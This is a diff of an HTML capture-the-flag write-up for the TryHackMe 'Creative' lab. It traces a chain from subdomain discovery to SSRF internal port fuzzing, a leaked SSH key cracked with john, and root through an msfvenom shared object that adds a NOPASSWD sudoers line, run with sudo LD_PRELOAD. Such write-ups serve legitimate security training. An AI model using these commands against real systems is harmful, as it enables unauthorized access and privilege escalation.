@@ -17,6 +17,8 @@
     <span class="sep">/</span>
     <a href="../../writeups.html">writeups</a>
     <span class="sep">/</span>
+    <a href="index.html">thm</a>
+    <span class="sep">/</span>
     <span class="current">creative</span>
 </nav>
 
@@ -31,7 +33,7 @@
     </div>
     <h1>Creative</h1>
     <div class="meta">
-        Target: <span>10.114.165.52</span> &nbsp;·&nbsp; Difficulty: <span>Easy</span> &nbsp;·&nbsp; Path: <span>Web → SSRF → SSH → PrivEsc</span>
+        Target: <span>10.114.165.52</span> &nbsp;·&nbsp; Path: <span>Web → SSRF → SSH → PrivEsc</span>
     </div>
 </header>
 
@@ -40,14 +42,15 @@
     <ol>
         <li><a href="#recon">Recon & Port Scanning</a></li>
         <li><a href="#web">Web Enumeration</a></li>
+        <li><a href="#subdomain">Subdomain Enumeration</a></li>
         <li><a href="#ssrf">SSRF Discovery</a></li>
         <li><a href="#ports">Internal Port Discovery</a></li>
         <li><a href="#sshkey">SSH Key Exposure</a></li>
+        <li><a href="#crack">Cracking the SSH Key</a></li>
         <li><a href="#access">Initial Access</a></li>
         <li><a href="#privesc">Privilege Escalation</a></li>
         <li><a href="#root">Root Access</a></li>
         <li><a href="#chain">Attack Chain</a></li>
-        <li><a href="#lessons">Key Takeaways</a></li>
     </ol>
 </div>
 
@@ -56,12 +59,10 @@
     <!-- RECON -->
     <div class="section" id="recon">
         <h2 class="section-title"><span class="icon">01</span> Recon & Port Scanning</h2>
-        <p>Full port scan with service and version detection:</p>
         <div class="code-block">
-            <div class="code-header"><span class="lang">bash</span><span>Nmap Scan</span></div>
+            <div class="code-header"><span class="lang">bash</span><span>Nmap Full Scan</span></div>
             <pre><code>nmap -sC -sV -p- 10.114.165.52</code></pre>
         </div>
-        <h3>📡 Open Ports</h3>
         <div class="table-wrap">
             <table>
                 <thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead>
@@ -71,7 +72,7 @@
                 </tbody>
             </table>
         </div>
-        <div class="callout">Port 80 exposes a web application — primary attack surface.</div>
+        <div class="callout">Port 80 selected as primary attack surface.</div>
     </div>
 
     <!-- WEB ENUM -->
@@ -82,107 +83,108 @@
             <div class="code-header"><span class="lang">bash</span><span>Update /etc/hosts</span></div>
             <pre><code>echo "10.114.165.52 creative.thm" | sudo tee -a /etc/hosts</code></pre>
         </div>
-        <h3>Directory Fuzzing</h3>
-        <div class="code-block">
-            <div class="code-header"><span class="lang">bash</span><span>Gobuster Dir</span></div>
-            <pre><code>gobuster dir -u http://creative.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
-        </div>
-        <p>No interesting directories found. Pivot to subdomain enumeration.</p>
-        <h3>Subdomain Fuzzing</h3>
+        <div class="callout">Directory fuzzing returned no interesting results. Pivot to subdomain enumeration.</div>
+    </div>
+
+    <!-- SUBDOMAIN -->
+    <div class="section" id="subdomain">
+        <h2 class="section-title"><span class="icon">03</span> Subdomain Enumeration</h2>
         <div class="code-block">
             <div class="code-header"><span class="lang">bash</span><span>Gobuster DNS</span></div>
             <pre><code>gobuster dns -d creative.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</code></pre>
         </div>
-        <div class="callout green">Subdomain discovered ✔️</div>
+        <p>Subdomain discovered. Added to <code>/etc/hosts</code> and further testing performed.</p>
+        <div class="callout green">Subdomain found ✔️</div>
     </div>
 
     <!-- SSRF -->
     <div class="section" id="ssrf">
-        <h2 class="section-title"><span class="icon">03</span> Parameter Analysis & SSRF Discovery</h2>
-        <p>Manual parameter testing revealed unsanitized input:</p>
-        <div class="code-block">
-            <div class="code-header"><span class="lang">url</span><span>LFI Attempt</span></div>
-            <pre><code>http://creative.thm/?contact-message=/etc/passwd</code></pre>
-        </div>
-        <p>Application did not sanitize the parameter — hints at file interaction and possible SSRF.</p>
-        <p>Further testing on the discovered subdomain confirmed a <strong style="color:#fff">Server-Side Request Forgery (SSRF)</strong> vulnerability.</p>
+        <h2 class="section-title"><span class="icon">04</span> SSRF Vulnerability Discovery</h2>
+        <p>The discovered <strong style="color:#fff">subdomain</strong> — not the main domain — contained an input parameter vulnerable to <strong style="color:#fff">Server-Side Request Forgery (SSRF)</strong>.</p>
+        <p>The SSRF endpoint allowed the server to make internal HTTP requests on our behalf.</p>
         <div class="callout">
-            🚨 SSRF allows the server to make requests on your behalf — including to internal services not exposed externally.
+            🚨 The main domain <code>creative.thm</code> was NOT vulnerable — only the subdomain. Always enumerate subdomains thoroughly.
         </div>
     </div>
 
     <!-- INTERNAL PORTS -->
     <div class="section" id="ports">
-        <h2 class="section-title"><span class="icon">04</span> Internal Port Discovery via SSRF</h2>
-        <p>A custom script was written to fuzz internal ports through the SSRF endpoint, probing <code>127.0.0.1:PORT</code> for each port.</p>
-        <h3>Open Internal Ports Discovered</h3>
+        <h2 class="section-title"><span class="icon">05</span> Internal Port Discovery via SSRF</h2>
+        <p>A custom script fuzzed internal ports by sending requests through the SSRF parameter targeting <code>127.0.0.1:PORT</code>.</p>
         <div class="code-block">
-            <div class="code-header"><span class="lang">output</span><span>Internal Ports</span></div>
-            <pre><code>80    → HTTP (internal)
-1337  → Sensitive data exposed</code></pre>
+            <div class="code-header"><span class="lang">output</span><span>Open Internal Ports</span></div>
+            <pre><code>80    → HTTP (internal web server)
+1337  → Sensitive internal data exposed</code></pre>
         </div>
         <div class="callout green">
-            💡 Port <strong style="color:#fff">1337</strong> returned sensitive server data — this is the key pivot point.
+            💡 Port <strong style="color:#fff">1337</strong> responded with sensitive server content — key pivot point.
         </div>
     </div>
 
     <!-- SSH KEY -->
     <div class="section" id="sshkey">
-        <h2 class="section-title"><span class="icon">05</span> SSH Key Exposure</h2>
-        <p>Interacting with port 1337 via SSRF revealed an SSH private key (<code>id_rsa</code>). The key was passphrase-protected.</p>
-        <h3>Cracking the Passphrase</h3>
-        <p>Convert the key to a crackable hash format:</p>
+        <h2 class="section-title"><span class="icon">06</span> SSH Private Key Exposure</h2>
+        <p>Interacting with the internal service on port 1337 via SSRF returned an SSH private key (<code>id_rsa</code>).</p>
+        <p>The key was passphrase-protected — cracking required.</p>
+        <div class="callout">
+            🚨 Exposed SSH keys are dangerous even when passphrase-protected — passphrases are frequently weak and crackable.
+        </div>
+    </div>
+
+    <!-- CRACK -->
+    <div class="section" id="crack">
+        <h2 class="section-title"><span class="icon">07</span> Cracking the SSH Key</h2>
+        <p>Convert the key to a format John can process:</p>
         <div class="code-block">
-            <div class="code-header"><span class="lang">bash</span><span>Convert Key for John</span></div>
+            <div class="code-header"><span class="lang">bash</span><span>Convert for John</span></div>
             <pre><code>ssh2john id_rsa > hash.txt</code></pre>
         </div>
-        <p>Crack with John the Ripper:</p>
+        <p>Run the cracker:</p>
         <div class="code-block">
             <div class="code-header"><span class="lang">bash</span><span>Crack Passphrase</span></div>
             <pre><code>john hash.txt</code></pre>
         </div>
-        <div class="callout green">Passphrase retrieved ✔️</div>
+        <div class="callout green">Passphrase recovered ✔️</div>
     </div>
 
     <!-- ACCESS -->
     <div class="section" id="access">
-        <h2 class="section-title"><span class="icon">06</span> Initial Access</h2>
+        <h2 class="section-title"><span class="icon">08</span> Initial Access</h2>
         <div class="code-block">
             <div class="code-header"><span class="lang">bash</span><span>SSH Login</span></div>
             <pre><code>chmod 600 id_rsa
 ssh -i id_rsa saad@10.114.165.52
-# Enter cracked passphrase when prompted</code></pre>
+# Enter recovered passphrase when prompted</code></pre>
         </div>
         <div class="callout green">Shell obtained as user <strong style="color:#fff">saad</strong> ✔️</div>
     </div>
 
     <!-- PRIVESC -->
     <div class="section" id="privesc">
-        <h2 class="section-title"><span class="icon">07</span> Privilege Escalation</h2>
-        <p>User <code>saad</code> had sudo access to specific binaries. Exploit using <code>LD_PRELOAD</code> to inject a malicious shared object.</p>
-        <h3>Step 1 — Generate Payload</h3>
+        <h2 class="section-title"><span class="icon">09</span> Privilege Escalation — LD_PRELOAD Abuse</h2>
+        <p>Generate a malicious shared object that writes a sudoers entry:</p>
         <div class="code-block">
-            <div class="code-header"><span class="lang">bash</span><span>msfvenom — Shared Object Payload</span></div>
+            <div class="code-header"><span class="lang">bash</span><span>Generate Payload</span></div>
             <pre><code>msfvenom -p linux/x64/exec \
   CMD="echo 'saad ALL=(ALL:ALL) NOPASSWD: ALL' > /etc/sudoers.d/saad" \
   AppendExit=true -f elf-so -o pwn.so</code></pre>
         </div>
-        <h3>Step 2 — Upload to Target</h3>
+        <p>Upload the payload to the target:</p>
         <div class="code-block">
-            <div class="code-header"><span class="lang">bash</span><span>SCP Upload</span></div>
+            <div class="code-header"><span class="lang">bash</span><span>Upload via SCP</span></div>
             <pre><code>scp -i id_rsa pwn.so saad@10.114.165.52:/tmp/</code></pre>
         </div>
-        <h3>Step 3 — Trigger via LD_PRELOAD</h3>
+        <p>Trigger execution via <code>LD_PRELOAD</code> with sudo:</p>
         <div class="code-block">
             <div class="code-header"><span class="lang">bash</span><span>Execute Payload</span></div>
             <pre><code>sudo LD_PRELOAD=/tmp/pwn.so /usr/bin/ping</code></pre>
         </div>
-        <div class="callout green">Full sudo privileges granted to saad ✔️</div>
+        <div class="callout green">Full NOPASSWD sudo granted to saad ✔️</div>
     </div>
 
     <!-- ROOT -->
     <div class="section" id="root">
-        <h2 class="section-title"><span class="icon">08</span> Root Access</h2>
+        <h2 class="section-title"><span class="icon">10</span> Root Access</h2>
         <div class="code-block">
             <div class="code-header"><span class="lang">bash</span><span>Escalate to Root</span></div>
             <pre><code>sudo su</code></pre>
@@ -196,48 +198,34 @@ ssh -i id_rsa saad@10.114.165.52
 
     <!-- CHAIN -->
     <div class="section" id="chain">
-        <h2 class="section-title"><span class="icon">09</span> Attack Chain</h2>
+        <h2 class="section-title"><span class="icon">11</span> Attack Chain</h2>
         <div class="chain">
             <div class="chain-step">Nmap → Ports 22, 80 identified</div>
             <div class="chain-arrow">↓</div>
+            <div class="chain-step">Web enumeration on port 80 → no directories found</div>
+            <div class="chain-arrow">↓</div>
             <div class="chain-step">Gobuster DNS → Subdomain discovered</div>
             <div class="chain-arrow">↓</div>
-            <div class="chain-step">Parameter testing → SSRF confirmed</div>
+            <div class="chain-step">Subdomain → SSRF vulnerability confirmed</div>
             <div class="chain-arrow">↓</div>
             <div class="chain-step">Internal port fuzzing via SSRF → Port 1337 found</div>
             <div class="chain-arrow">↓</div>
-            <div class="chain-step">Port 1337 → SSH private key leaked</div>
+            <div class="chain-step">Port 1337 → SSH private key (id_rsa) leaked</div>
             <div class="chain-arrow">↓</div>
             <div class="chain-step">ssh2john + john → Passphrase cracked</div>
             <div class="chain-arrow">↓</div>
             <div class="chain-step">SSH login as saad</div>
             <div class="chain-arrow">↓</div>
-            <div class="chain-step">msfvenom LD_PRELOAD → sudo escalation</div>
+            <div class="chain-step">msfvenom payload + LD_PRELOAD → sudoers modified</div>
             <div class="chain-arrow">↓</div>
-            <div class="chain-step" style="border-left-color: var(--green); color: var(--green);">ROOT ACCESS ✅</div>
-        </div>
-    </div>
-
-    <!-- LESSONS -->
-    <div class="section" id="lessons">
-        <h2 class="section-title"><span class="icon">10</span> Key Takeaways</h2>
-        <ul class="lessons-list">
-            <li>Always test parameters manually — automated tools miss SSRF vectors.</li>
-            <li>SSRF can expose internal services invisible from outside.</li>
-            <li>Internal port fuzzing via SSRF is a powerful lateral technique.</li>
-            <li>Exposed SSH keys are dangerous even when passphrase-protected — they're often crackable.</li>
-            <li>Misconfigured sudo + LD_PRELOAD = instant root.</li>
-        </ul>
-        <div class="callout" style="margin-top:28px;">
-            <strong style="color:#fff">Final Thought:</strong> Creative demonstrates a clean chained attack —
-            <strong style="color:var(--red)">SSRF → Key Leak → Passphrase Crack → LD_PRELOAD Abuse</strong> = full compromise.
+            <div class="chain-step" style="border-left-color:var(--green);color:var(--green);">ROOT ACCESS ✅</div>
         </div>
     </div>
 
 </main>
 
 <footer>
-    <a href="../../writeups.html">← All Writeups</a> <a href="../../writeups.html">← Back to Writeups</a>nbsp;·<a href="../../writeups.html">← Back to Writeups</a>nbsp; <a href="index.html">← TryHackMe</a> &nbsp;·&nbsp; © 2026 Oussama Zehri
+    <a href="index.html">← TryHackMe</a> &nbsp;·&nbsp; <a href="../../writeups.html">← All Writeups</a> &nbsp;·&nbsp; © 2026 Oussama Zehri
 </footer>
 
 </body>
